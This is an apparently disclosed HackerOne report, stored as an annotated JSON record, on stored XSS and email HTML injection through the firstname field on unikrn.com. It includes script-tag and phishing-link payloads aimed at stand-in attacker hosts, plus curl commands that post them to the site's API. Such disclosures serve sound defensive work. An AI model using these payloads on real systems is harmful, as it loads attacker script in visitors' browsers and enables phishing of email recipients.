{
    "reported_to": "Unikrn",
    "reported_by": "coreyd97 ",
    "title": "HTML injection in email in unikrn.com",
    "content": "\nNOTE! Thanks for submitting a report! Please replace all the [square] sections below with the pertinent details. Remember, the more detail you provide, the easier it is for us to verify and then potentially issue a bounty, so be sure to take your time filling out the report! Please add the affected domain name in the Title of the report.\nSummary: Referral emails sent from unikrn.com are vulnerable to HTML injection via the first name field.\nDescription: Due to a lack of sanitization and validation when posting to https://unikrn.com/apiv2/user/verify a user may set a number of profile fields to values which should not be acceptable. This allows for a possible XSS within the raffle areas of the website and HTML injection within the referral email sent by unikrn.com.\nThe user may insert a payload into the firstname field which is later used to generate the users 'callsign'. The callsign value is safely used in other locations in the site within ng-bind attributes however in the case of viewing a raffle winner, the value is instead transformed by the 'vartrans' directive. This directive permits html to be inserted as part of the \"raffle_winner_sidebar_body\" text and is done so without any sanitization.\nTherefore should a user set their first name as '<script src=\\\"https://external.com/xss.js\\\" />' when the user wins a raffle, any visitor to that raffles page will result in the external script being loaded.\nAlongside this XSS it was also found that should a user set their first name to a value containing a script tag, when a referral email is sent to an address, any email content after the script tag is ignored. As the field's maximum length is 256 characters, an attacker would have 248 characters to craft a malicious email or instead embed an image with the email content to allow for a larger word count.\nAn example payload may be\n<a href=\\\"https://attacker/phish.php\\\"><img src=\\\"https://attacker/content.jpg\\\"></a><script>\nRemedies for this would include proper sanitization of user fields when processed by the verify page and when passed as arguments to the vartrans directive to prevent similar issues in future, as well as a more strict content security policy and the stripping of all html characters when using user input within parameters to be used within an email.\nSteps To Reproduce:\nXSS:\nUse the provided curl command to set a users first name to an xss payload such as <script src=\\\"https://external2.com/xss.js\\\" />\nWin a raffle\nVisit the raffles page once you have been announced as a winner. ## Email HTML Injection:\nUse the provided curl command to set a users first name to a payload such as <a href=\\\"https://attacker/phish.php\\\"><img src=\\\"https://attacker/content.jpg\\\"></a><script>\nNavigate to the profile page and send a referral email.\nSupporting Material/References:\nXSS\ncurl -i -s -k -X $'POST' -H $'Content-Type: application/json' --data-binary $'{\\\"country\\\":\\\"GB\\\",\\\"firstname\\\":\\\"<script src=\\\\\"https://external2.com/xss.js\\\\\\\" />\\\", \\\"session_id\\\":\\\"SESSION_ID\\\"}' $'https://unikrn.com/apiv2/user/verify'\nEmail HTML Injection\ncurl -i -s -k -X $'POST' -H $'Content-Type: application/json' --data-binary $'{\\\"country\\\":\\\"GB\\\",\\\"firstname\\\":\\\"<a href=\\\\\"https://attacker/phish.php\\\\\"><img src=\\\\\"https://attacker/content.jpg\\\\\"></a><script>\\\", \\\"session_id\\\":\\\"SESSION_ID\\\"}' $'https://unikrn.com/apiv2/user/verify'\n\n",
    "severity": [
        7.0,
        8.9
    ],
    "bounty": null,
    "weaknesses": [
        "Command Injection - Generic"
    ],
    "screenshots": {},
    "disclosed_date": 1503490860,
    "report_url": "https://hackerone.com/reports/262004",
    "is_multi_component": true,
    "complexity": "HIGH",
    "novelty": "HIGH",
    "vuln_category": "WEB_APP",
    "steps": [
        [
            1,
            "Use the provided curl command to set a user's first name to an XSS payload such as `<script src=\\\"https://external2.com/xss.js\\\" />`."
        ],
        [
            2,
            "Win a raffle and visit the raffles page once announced as a winner to trigger the XSS."
        ],
        [
            3,
            "For email HTML injection, set the first name to a payload like `<a href=\\\"https://attacker/phish.php\\\"><img src=\\\"https://attacker/content.jpg\\\"></a><script>`."
        ],
        [
            4,
            "Navigate to the profile page and send a referral email to observe the HTML injection."
        ]
    ],
    "vuln_description": "The vulnerability involves HTML injection and XSS via the first name field in unikrn.com's referral emails and raffle winner announcements. Lack of sanitization allows malicious scripts or HTML to be executed or displayed when the user's input is rendered in emails or on the website.",
    "reason": "The attack requires understanding of HTML injection and XSS, but the steps to exploit are straightforward once the vulnerable field is identified. The interaction between the user input and the email/raffle system is direct and does not involve complex application states or novel logic.",
    "new_complexity": "MEDIUM",
    "requires_code": false,
    "requires_CVE": false,
    "is_ctf": false,
    "other_report": null,
    "authnz_metadata": {
        "reason": "The vulnerability involves HTML injection and XSS via user input fields (first name) in the profile update and email referral functionality. The proposed methodology focuses on testing authorization and authentication boundaries by swapping user sessions and resource IDs, but does not specifically address input validation or output encoding issues. The HTML injection and XSS vulnerabilities are more related to improper sanitization of user input rather than authorization or authentication flaws.",
        "is_detectable": false
    }
}